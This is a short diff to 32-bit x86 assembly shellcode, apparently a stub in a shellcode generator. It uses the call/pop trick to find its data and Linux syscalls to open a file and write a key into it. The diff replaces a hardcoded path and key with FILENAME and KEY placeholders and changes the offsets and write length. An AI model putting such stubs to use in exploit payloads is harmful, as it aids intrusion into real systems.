@@ -7,7 +7,7 @@ thestart1:
 
 popl %ebx           ## ebx = filepath
 movl %ebx, %esi     
-addl $0x38, %esi    ## esi = key
+addl $0xaa, %esi    ## filename length
 
 xorl %eax, %eax
 movw $1025, %ax
@@ -22,7 +22,7 @@ movl %eax, %edx
 ######## edx=open (filepath, 1, 0)
 
 xorl %eax, %eax
-movb $0x0c, %al
+movb $0xee, %al
 push %eax        ## 32 bytes
 push %esi        ## buff
 movl %edx, %eax  ## write to the file
@@ -38,6 +38,6 @@ int $0x80
 
 data_path:
 call thestart1
-.ascii "/root/demian_override/shellcode/scodeGenerator/stub/key\0"
-.ascii "key contents\0"
+.ascii "FILENAME\0"
+.ascii "KEY\0"
 
